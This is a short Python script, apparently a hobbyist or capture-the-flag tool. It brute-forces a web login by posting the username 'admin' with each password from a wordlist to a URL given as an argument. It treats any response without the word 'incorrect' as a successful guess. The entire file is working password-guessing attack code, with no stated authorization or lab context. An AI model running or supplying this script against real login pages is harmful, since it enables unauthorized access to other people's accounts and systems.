import requests
import sys

url = sys.argv[1]
wordlist = "wordlist.txt"
expression = "incorrect"

def brute(username, password):
    data = {'username':username, 'password':password}
    r = requests.post(url, data = data)
    
    if expression not in r.text:
        print("[*] Correct Password Found: ", password)
        sys.exit(1)
    else:
        pass
    
def main():
    words = [w.strip() for w in open(wordlist,"rb").readlines()]
    for payload in words:
        brute("admin", payload)
        
if __name__ == '__main__':
    main()
            